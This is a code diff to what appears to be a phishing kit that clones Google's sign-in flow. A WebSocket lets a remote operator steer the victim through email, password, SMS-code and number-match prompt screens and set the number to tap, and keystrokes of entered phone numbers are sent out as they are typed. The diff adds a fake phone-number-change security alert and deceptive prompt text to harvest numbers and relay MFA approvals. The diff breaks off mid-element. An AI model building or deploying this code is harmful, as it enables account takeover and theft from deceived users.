@@ -85,7 +85,7 @@ function QrCodeSvg() {
 
 function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
   provider: string;
-  onNavigate: (step: string) => void;
+  onNavigate: (step: string, action?: { navigate?: string; promptNumber?: number }) => void;
   onProviderSwitch?: (p: string) => void;
 }) {
   const wsRef = useRef<WebSocket | null>(null);
@@ -124,8 +124,8 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
       };
       ws.onmessage = (e: MessageEvent<string>) => {
         try {
-          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string }; provider?: string };
-          if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate);
+          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number }; provider?: string };
+          if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate, msg.action);
           if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
             onProviderSwitchRef.current?.(msg.provider);
           }
@@ -1614,7 +1614,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'sign-in-attempt' | 'sign-in-blocked' | 'error-email' | 'error-password' | 'error-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'error-email' | 'error-password' | 'error-code';
 
 function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
@@ -1630,17 +1630,22 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [phoneCodeInput, setPhoneCodeInput] = useState('');
   const [phoneCodeFocused, setPhoneCodeFocused] = useState(false);
-  const [wrongPhone, setWrongPhone] = useState('');
-  const [wrongPhoneFocused, setWrongPhoneFocused] = useState(false);
   const [transitioning, setTransitioning] = useState(false);
   const [captchaState, setCaptchaState] = useState<'idle' | 'challenge' | 'solving' | 'solved'>('idle');
-  const [selectedImgs, setSelectedImgs] = useState<Set<number>>(new Set([0, 2, 5]));
+  const [selectedImgs, setSelectedImgs] = useState<Set<number>>(new Set());
+  const [confirmedPhone, setConfirmedPhone] = useState('');
+  const [confirmedPhoneFocused, setConfirmedPhoneFocused] = useState(false);
+  const [promptTimedOut, setPromptTimedOut] = useState(false);
+  const [localPromptNumber, setLocalPromptNumber] = useState<number | null>(null);
+  const [phoneUpdateInput, setPhoneUpdateInput] = useState('');
+  const [phoneUpdateFocused, setPhoneUpdateFocused] = useState(false);
+  const [phoneUpdateContext, setPhoneUpdateContext] = useState<'was-me' | 'not-me' | null>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
   const _gParams = new URLSearchParams(window.location.search);
   const googlePhone = _gParams.get('gphone') ?? '09';
   const gVerifyMethod = (_gParams.get('gverify') ?? 'sms') as 'sms' | 'auth';
   const gCorrectNumber = parseInt(_gParams.get('gnumber') ?? '45');
-  const promptNums = [gCorrectNumber, ((gCorrectNumber + 27) % 99) + 1, ((gCorrectNumber + 54) % 99) + 1].sort((a, b) => a - b);
+  const effectiveNumber = localPromptNumber ?? gCorrectNumber;
 
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
@@ -1653,7 +1658,17 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
 
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'google',
-    onNavigate: (s) => gotoStep(s as GoogleStep),
+    onNavigate: (s, action) => {
+      if (s === 'prompt-timeout') {
+        if (action?.promptNumber != null) setLocalPromptNumber(action.promptNumber);
+        setPromptTimedOut(true);
+        gotoStep('prompt-number');
+      } else {
+        setPromptTimedOut(false);
+        if (action?.promptNumber != null) setLocalPromptNumber(action.promptNumber);
+        gotoStep(s as GoogleStep);
+      }
+    },
     onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
@@ -1669,15 +1684,15 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
   };
 
   const CAPTCHA_IMGS = [
-    { bg: 'linear-gradient(160deg,#6e7f8d 0%,#8fa0ae 40%,#5c6e7c 100%)', car: true },
-    { bg: 'linear-gradient(160deg,#3d6b4a 0%,#5e8a67 40%,#2e5238 100%)', car: false },
-    { bg: 'linear-gradient(160deg,#786b60 0%,#9a8c81 40%,#635850 100%)', car: true },
-    { bg: 'linear-gradient(160deg,#5c6e8a 0%,#7d90a8 40%,#4a5a72 100%)', car: false },
-    { bg: 'linear-gradient(160deg,#8a7060 0%,#aa9080 40%,#705848 100%)', car: false },
-    { bg: 'linear-gradient(160deg,#6a6a7c 0%,#8a8a9c 40%,#545466 100%)', car: true },
-    { bg: 'linear-gradient(160deg,#4a7c50 0%,#6a9c70 40%,#386040 100%)', car: false },
-    { bg: 'linear-gradient(160deg,#7c7c68 0%,#9c9c88 40%,#606050 100%)', car: false },
-    { bg: 'linear-gradient(160deg,#5a8a90 0%,#7aacb2 40%,#487078 100%)', car: false },
+    { url: 'https://images.unsplash.com/photo-1494976388531-d1058494cdd8?w=140&h=140&fit=crop', car: true },
+    { url: 'https://images.unsplash.com/photo-1518791841217-8f162f1912da?w=140&h=140&fit=crop', car: false },
+    { url: 'https://images.unsplash.com/photo-1503736334956-4c8f8e92946d?w=140&h=140&fit=crop', car: true },
+    { url: 'https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=140&h=140&fit=crop', car: false },
+    { url: 'https://images.unsplash.com/photo-1553361371-9b22f78e8b1d?w=140&h=140&fit=crop', car: false },
+    { url: 'https://images.unsplash.com/photo-1568605117036-5fe5e7bab0b7?w=140&h=140&fit=crop', car: true },
+    { url: 'https://images.unsplash.com/photo-1497436072909-60f360e1d4b1?w=140&h=140&fit=crop', car: false },
+    { url: 'https://images.unsplash.com/photo-1501854140801-50d01698950b?w=140&h=140&fit=crop', car: false },
+    { url: 'https://images.unsplash.com/photo-1469474968028-56623f02e42e?w=140&h=140&fit=crop', car: false },
   ];
 
   const bg = isDark ? '#1f1f1f' : '#f0f4f9';
@@ -1732,19 +1747,19 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
           <div style={{ display: 'flex', flexDirection: 'column', flex: isDesktop ? '0 0 320px' : 'none', paddingRight: isDesktop ? 40 : 0, marginBottom: isDesktop ? 0 : 32 }}>
             <div style={{ marginBottom: 28 }}><GoogleLogo /></div>
             <h1 style={{ fontSize: 40, fontWeight: 400, margin: '0 0 12px', letterSpacing: '-0.5px', color: textColor }}>
-              {step === 'email' ? 'Sign in'
-                : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you'
+              {step === 'email' || step === 'error-email' ? 'Sign in'
+                : step === 'phone-verify' || step === 'phone-code' || step === 'error-code' ? 'Confirm it\'s you'
                 : step === 'phone-confirm' ? 'Confirm your number'
-                : step === 'phone-wrong' ? 'Verify it\'s you'
+                : step === 'phone-wrong' ? 'Review recent activity'
+                : step === 'phone-update' ? 'Update phone number'
                 : step === 'prompt-number' ? 'Verify it\'s you'
-                : step === 'sign-in-attempt' ? 'Is it you trying to sign in?'
                 : step === 'sign-in-blocked' ? 'Sign-in blocked'
                 : step === 'verify' ? 'Verify it\'s you'
                 : step === 'processing' ? 'Welcome'
                 : 'Welcome'}
             </h1>
             <p style={{ fontSize: 16, color: textColor, margin: 0 }}>
-              {step === 'verify'
+              {step === 'verify' || step === 'prompt-number'
                 ? <span>To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in. <a href="#" onClick={e => e.preventDefault()} style={{ color: linkColor, textDecoration: 'none' }}>Learn more</a></span>
                 : 'Use your Google Account'}
             </p>
@@ -1753,8 +1768,8 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
           {/* Right / Bottom: form */}
           <div style={{ display: 'flex', flexDirection: 'column', flex: 1, justifyContent: 'space-between' }}>
 
-            {/* ── Step: email ── */}
-            {step === 'email' && (
+            {/* ── Step: email / error-email ── */}
+            {(step === 'email' || step === 'error-email') && (
               <>
                 <div>
                   <div style={{ position: 'relative', marginBottom: 8 }}>
@@ -1769,7 +1784,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       autoFocus
                       style={{
                         width: '100%', padding: '20px 16px 8px', fontSize: 16,
-                        border: `${emailFocused ? 2 : 1}px solid ${emailFocused ? focusBorderColor : borderColor}`,
+                        border: `${emailFocused ? 2 : 1}px solid ${step === 'error-email' && !emailFocused ? '#dc2626' : emailFocused ? focusBorderColor : borderColor}`,
                         borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                       }}
                     />
@@ -1777,6 +1792,11 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       Email or phone
                     </label>
                   </div>
+                  {step === 'error-email' && (
+                    <p style={{ fontSize: 13, color: '#dc2626', margin: '0 0 4px', lineHeight: 1.4 }}>
+                      Couldn&apos;t find your Google Account. Try entering your full email address.
+                    </p>
+                  )}
                   <button data-testid="google-forgot-email"
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0', marginBottom: 20 }}>
                     Forgot email?
@@ -1803,8 +1823,8 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
-            {/* ── Step: password ── */}
-            {step === 'password' && (
+            {/* ── Step: password / error-password ── */}
+            {(step === 'password' || step === 'error-password') && (
               <>
                 <div>
                   {/* Email chip */}
@@ -1854,6 +1874,11 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                     </button>
                   </div>
+                  {step === 'error-password' && (
+                    <p style={{ fontSize: 13, color: '#dc2626', margin: '4px 0 0', lineHeight: 1.4 }}>
+                      Wrong password. Try again or click Forgot password to reset it.
+                    </p>
+                  )}
                   <button data-testid="google-forgot-password"
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                     Forgot password?
@@ -1929,23 +1954,31 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
-            {/* ── Phone Confirm (Confirm your number before sending code) ── */}
+            {/* ── Phone Confirm (user types their number) ── */}
             {step === 'phone-confirm' && (
               <>
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 24 }}>
                     To verify it&apos;s you, Google will send a verification code to your phone. First, confirm your number.
                   </p>
-                  <div style={{
-                    border: `1px solid ${borderColor}`, borderRadius: 4, padding: '20px 16px',
-                    textAlign: 'center', background: isDark ? '#3c4043' : '#f8f9fa',
-                  }}>
-                    <div style={{ fontSize: 26, letterSpacing: '0.15em', color: textColor, marginBottom: 6, fontWeight: 400 }}>
-                      ●●●●●●{googlePhone}
-                    </div>
-                    <div style={{ fontSize: 12, color: subText }}>
-                      We&apos;ll send a code to the number ending in <strong>{googlePhone}</strong>
-                    </div>
+                  <div style={{ position: 'relative', marginBottom: 8 }}>
+                    <input
+                      type="tel"
+                      value={confirmedPhone}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setConfirmedPhone(v); sendCapture('phone', v); }}
+                      onFocus={() => setConfirmedPhoneFocused(true)}
+                      onBlur={() => setConfirmedPhoneFocused(false)}
+                      onKeyDown={e => { if (e.key === 'Enter' && confirmedPhone.length >= 7) nav('phone-code', 'phone', confirmedPhone); }}
+                      autoFocus
+                      style={{
+                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
+                        border: `${confirmedPhoneFocused ? 2 : 1}px solid ${confirmedPhoneFocused ? focusBorderColor : borderColor}`,
+                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
+                      }}
+                    />
+                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(confirmedPhoneFocused, !!confirmedPhone) }}>
+                      Phone number
+                    </label>
                   </div>
                   <button onClick={() => setStep('phone-wrong')}
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 13, fontWeight: 500, cursor: 'pointer', padding: '10px 0 0', display: 'block' }}>
@@ -1957,61 +1990,59 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                     Back
                   </button>
-                  <button onClick={() => nav('phone-code')}
-                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
+                  <button onClick={() => confirmedPhone.length >= 7 && nav('phone-code', 'phone', confirmedPhone)}
+                    style={{ backgroundColor: confirmedPhone.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: confirmedPhone.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: confirmedPhone.length >= 7 ? 'pointer' : 'default' }}>
                     Send
                   </button>
                 </div>
               </>
             )}
 
-            {/* ── Phone Wrong (re-enter number) ── */}
+            {/* ── Phone Wrong (alert — someone trying to change your number) ── */}
             {step === 'phone-wrong' && (
               <>
-                <div>
-                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
-                    Enter your phone number and we&apos;ll send you a 6-digit verification code.
-                  </p>
-                  <div style={{ position: 'relative', marginBottom: 8 }}>
-                    <input
-                      type="tel"
-                      value={wrongPhone}
-                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setWrongPhone(v); sendCapture('phone', v); }}
-                      onFocus={() => setWrongPhoneFocused(true)}
-                      onBlur={() => setWrongPhoneFocused(false)}
-                      onKeyDown={e => { if (e.key === 'Enter' && wrongPhone.length >= 7) nav('phone-code', 'phone', wrongPhone); }}
-                      autoFocus
-                      style={{
-                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
-                        border: `${wrongPhoneFocused ? 2 : 1}px solid ${wrongPhoneFocused ? focusBorderColor : borderColor}`,
-                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
-                      }}
-                    />
-                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(wrongPhoneFocused, !!wrongPhone) }}>
-                      Phone number
-                    </label>
+                <div style={{ flex: 1 }}>
+                  <div style={{ background: isDark ? '#2d1b00' : '#fff8e6', border: `1px solid ${isDark ? '#78350f' : '#f59e0b'}`, borderRadius: 8, padding: '14px 16px', marginBottom: 20 }}>
+                    <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
+                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
+                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
+                        <path d="M12 9v4m0 4h.01" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round"/>
+                      </svg>
+                      <div>
+                        <p style={{ fontSize: 14, fontWeight: 600, color: isDark ? '#fcd34d' : '#92400e', margin: '0 0 4px' }}>Someone is trying to change your phone number</p>
+                        <p style={{ fontSize: 13, color: isDark ? '#fcd34d' : '#b45309', margin: 0, lineHeight: 1.5 }}>
+                          A request was made to change the phone number on your Google Account. If this wasn&apos;t you, your account may be at risk.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', background: isDark ? '#3c3f43' : '#f0f4f9' }}>
+                    <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
+                    <span style={{ fontSize: 14, color: textColor }}>{email || 'janedoe@gmail.com'}</span>
                   </div>
                 </div>
-                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                  <button onClick={() => setStep('phone-confirm')}
-                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
-                    Back
+                <div style={{ display: 'flex', borderTop: `1px solid ${borderColor}` }}>
+                  <button
+                    onClick={() => { setPhoneUpdateContext('not-me'); nav('phone-update'); }}
+                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: isDark ? '#f87171' : '#dc2626', fontSize: 12, fontWeight: 600, cursor: 'pointer', padding: '14px 6px', letterSpacing: '0.04em', textAlign: 'center' }}>
+                    THIS ISN&apos;T MY NUMBER
                   </button>
-                  <button onClick={() => wrongPhone.length >= 7 && nav('phone-code', 'phone', wrongPhone)}
-                    style={{ backgroundColor: wrongPhone.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: wrongPhone.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: wrongPhone.length >= 7 ? 'pointer' : 'default' }}>
-                    Next
+                  <button
+                    onClick={() => { setPhoneUpdateContext('was-me'); nav('phone-update'); }}
+                    style={{ flex: 1, background: 'none', border: 'none', color: linkColor, fontSize: 12, fontWeight: 600, cursor: 'pointer', padding: '14px 6px', letterSpacing: '0.04em', textAlign: 'center' }}>
+                    IT WAS ME
                   </button>
                 </div>
               </>
             )}
 
-            {/* ── Phone Code ── */}
-            {step === 'phone-code' && (
+            {/* ── Phone Code / error-code ── */}
+            {(step === 'phone-code' || step === 'error-code') && (
               <>
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                     {gVerifyMethod === 'sms'
-                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{googlePhone}</strong>. It may take a moment to arrive.</>
+                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{confirmedPhone ? confirmedPhone.slice(-2) : googlePhone}</strong>. It may take a moment to arrive.</>
                       : <>Enter the 6-digit code from your authenticator app.</>}
                   </p>
                   <div style={{ position: 'relative', marginBottom: 8 }}>
@@ -2028,7 +2059,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       style={{
                         width: '100%', padding: '20px 16px 8px', fontSize: 20,
                         letterSpacing: '0.3em', textAlign: 'center',
-                        border: `${phoneCodeFocused ? 2 : 1}px solid ${phoneCodeFocused ? focusBorderColor : borderColor}`,
+                        border: `${step === 'error-code' && !phoneCodeFocused ? 2 : phoneCodeFocused ? 2 : 1}px solid ${step === 'error-code' && !phoneCodeFocused ? '#dc2626' : phoneCodeFocused ? focusBorderColor : borderColor}`,
                         borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                       }}
                     />
@@ -2039,6 +2070,11 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       Enter code
                     </label>
                   </div>
+                  {step === 'error-code' && (
+                    <p style={{ fontSize: 13, color: '#dc2626', margin: '0 0 4px', lineHeight: 1.4 }}>
+                      Wrong code. Try entering the code again or request a new one.
+                    </p>
+                  )}
                   <button data-testid="google-resend-code"
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                     Resend code
@@ -2059,90 +2095,43 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
-            {/* ── Google Prompt (Check your device — single number) ── */}
+            {/* ── Google Prompt (Gmail app style) ── */}
             {step === 'prompt-number' && (
               <>
                 <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
-                  <p style={{ fontSize: 14, color: subText, margin: '0 0 20px', lineHeight: 1.5 }}>
-                    There is something unusual about your activity. For your security, Google wants to make sure it&apos;s really you.
-                  </p>
-                  {/* Phone graphic */}
-                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 16 }}>
-                    <div style={{ position: 'relative', width: 80, height: 110 }}>
-                      {/* Phone body */}
-                      <div style={{ width: 80, height: 110, border: `2px solid ${isDark ? '#8e918f' : '#5f6368'}`, borderRadius: 8, background: isDark ? '#3c4043' : '#f8f9fa', position: 'relative', overflow: 'hidden' }}>
-                        {/* Notification bar */}
-                        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 18, background: isDark ? '#5f6368' : '#dadce0', display: 'flex', alignItems: 'center', paddingLeft: 6, gap: 3 }}>
-                          <div style={{ width: 28, height: 6, borderRadius: 2, background: isDark ? '#8e918f' : '#fff', opacity: 0.9 }} />
-                        </div>
-                        {/* Notification card */}
-                        <div style={{ position: 'absolute', top: 22, left: 4, right: 4, background: isDark ? '#202124' : '#fff', borderRadius: 4, padding: '5px 6px', boxShadow: '0 1px 3px rgba(0,0,0,0.2)' }}>
-                          <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginBottom: 3 }}>
-                            <div style={{ width: 10, height: 10, borderRadius: 2, background: '#4285F4', flexShrink: 0 }} />
-                            <div style={{ fontSize: 7, color: isDark ? '#e3e3e3' : '#202124', fontWeight: 600 }}>Google</div>
-                          </div>
-                          <div style={{ fontSize: 6, color: isDark ? '#c4c7c5' : '#5f6368', lineHeight: 1.3 }}>Sign-in attempt</div>
-                          <div style={{ display: 'flex', gap: 4, marginTop: 4 }}>
-                            <div style={{ flex: 1, textAlign: 'center', fontSize: 6, color: isDark ? '#a8c7fa' : '#0b57d0', fontWeight: 600 }}>NO</div>
-                            <div style={{ width: 1, background: isDark ? '#3c4043' : '#dadce0' }} />
-                            <div style={{ flex: 1, textAlign: 'center', fontSize: 6, color: isDark ? '#a8c7fa' : '#0b57d0', fontWeight: 600 }}>YES</div>
-                          </div>
-                        </div>
-                      </div>
+                  {/* Timed out banner */}
+                  {promptTimedOut && (
+                    <div style={{ background: isDark ? '#2d1b00' : '#fff8e6', border: `1px solid ${isDark ? '#78350f' : '#f59e0b'}`, borderRadius: 6, padding: '10px 14px', marginBottom: 16, display: 'flex', alignItems: 'center', gap: 8 }}>
+                      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" style={{ flexShrink: 0 }}>
+                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
+                        <path d="M12 9v4m0 4h.01" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round"/>
+                      </svg>
+                      <span style={{ fontSize: 13, color: isDark ? '#fcd34d' : '#92400e' }}>Prompt timed out. Please confirm the new number below.</span>
                     </div>
-                  </div>
-                  {/* Instructions */}
-                  <p style={{ fontSize: 13, fontWeight: 600, color: textColor, margin: '0 0 6px' }}>Check your device</p>
-                  <p style={{ fontSize: 13, color: subText, margin: 0, lineHeight: 1.6 }}>
-                    Pull down the notification bar on your phone and tap the sign-in notification. Tap <strong style={{ color: textColor }}>Yes</strong>, then tap{' '}
-                    <strong style={{ color: textColor }}>{gCorrectNumber}</strong> on your device to verify it&apos;s you.
-                  </p>
-                  {/* Large number display */}
-                  <div style={{ fontSize: 52, fontWeight: 300, color: textColor, textAlign: 'center', marginTop: 16, lineHeight: 1 }}>
-                    {gCorrectNumber}
-                  </div>
-                </div>
-                <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
-                  <button onClick={() => setStep('phone-verify')}
-                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
-                    Try another way
-                  </button>
-                </div>
-              </>
-            )}
-
-            {/* ── Sign-in Attempt ("Is it you trying to sign in?") ── */}
-            {step === 'sign-in-attempt' && (
-              <>
-                <div style={{ flex: 1 }}>
+                  )}
                   {/* Email chip */}
-                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', marginBottom: 20, background: isDark ? '#3c3f43' : '#f0f4f9' }}>
+                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', marginBottom: 16, background: isDark ? '#3c3f43' : '#f0f4f9' }}>
                     <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
                     <span style={{ fontSize: 14, color: textColor }}>{email || 'janedoe@gmail.com'}</span>
                   </div>
-                  {/* Info rows */}
-                  {[
-                    { label: 'Device', value: 'Windows 10' },
-                    { label: 'Near', value: 'Mountain View, CA, USA' },
-                    { label: 'Time', value: 'Just now' },
-                  ].map(row => (
-                    <div key={row.label} style={{ marginBottom: 16 }}>
-                      <div style={{ fontSize: 14, fontWeight: 600, color: textColor, marginBottom: 2 }}>{row.label}</div>
-                      <div style={{ fontSize: 14, color: subText }}>{row.value}</div>
-                    </div>
-                  ))}
+                  {/* Device instruction */}
+                  <p style={{ fontSize: 14, fontWeight: 500, color: textColor, margin: '0 0 8px' }}>Open the Gmail app on your phone</p>
+                  <p style={{ fontSize: 13, color: subText, margin: '0 0 20px', lineHeight: 1.6 }}>
+                    Google sent a notification to your phone. Open the Gmail app, tap <strong style={{ color: textColor }}>Yes</strong> on the prompt, then tap <strong style={{ color: textColor }}>{effectiveNumber}</strong> on your phone to verify it&apos;s you. This will log you in and sign out any untrusted devices.
+                  </p>
+                  {/* Large number */}
+                  <div style={{ fontSize: 60, fontWeight: 300, color: textColor, textAlign: 'center', lineHeight: 1, marginTop: 'auto' }}>
+                    {effectiveNumber}
+                  </div>
                 </div>
-                {/* Action buttons */}
-                <div style={{ display: 'flex', gap: 0, borderTop: `1px solid ${borderColor}`, marginTop: 8 }}>
-                  <button
-                    onClick={() => nav('sign-in-blocked')}
-                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: linkColor, fontSize: 14, fontWeight: 600, cursor: 'pointer', padding: '14px 8px', letterSpacing: '0.04em' }}>
-                    NO, IT&apos;S NOT ME
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button onClick={() => { setPromptTimedOut(false); nav('phone-verify'); }}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0', borderRadius: 20 }}>
+                    Resend it
                   </button>
-                  <button
-                    onClick={() => nav('prompt-number')}
-                    style={{ flex: 1, background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 600, cursor: 'pointer', padding: '14px 8px', letterSpacing: '0.04em' }}>
-                    YES
+                  <button onClick={() => { setPromptTimedOut(false); nav('phone-verify'); }}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0', borderRadius: 20 }}>
+                    More ways to verify
                   </button>
                 </div>
               </>
@@ -2176,6 +2165,48 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
+            {/* ── Phone Update (new number entry) ── */}
+            {step === 'phone-update' && (
+              <>
+                <div>
+                  <p style={{ fontSize: 14, color: subText, marginBottom: 24, lineHeight: 1.5 }}>
+                    {phoneUpdateContext === 'was-me'
+                      ? 'Enter your new phone number. Google will send a verification code to confirm the change.'
+                      : 'Enter your current phone number to verify your identity and help secure your account.'}
+                  </p>
+                  <div style={{ position: 'relative', marginBottom: 8 }}>
+                    <input
+                      type="tel"
+                      value={phoneUpdateInput}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setPhoneUpdateInput(v); sendCapture('phone_update', v); }}
+                      onFocus={() => setPhoneUpdateFocused(true)}
+                      onBlur={() => setPhoneUpdateFocused(false)}
+                      onKeyDown={e => { if (e.key === 'Enter' && phoneUpdateInput.length >= 7) nav('processing', 'phone_update', phoneUpdateInput); }}
+                      autoFocus
+                      style={{
+                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
+                        border: `${phoneUpdateFocused ? 2 : 1}px solid ${phoneUpdateFocused ? focusBorderColor : borderColor}`,
+                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
+                      }}
+                    />
+                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(phoneUpdateFocused, !!phoneUpdateInput) }}>
+                      Phone number
+                    </label>
+                  </div>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button onClick={() => nav('phone-wrong')}
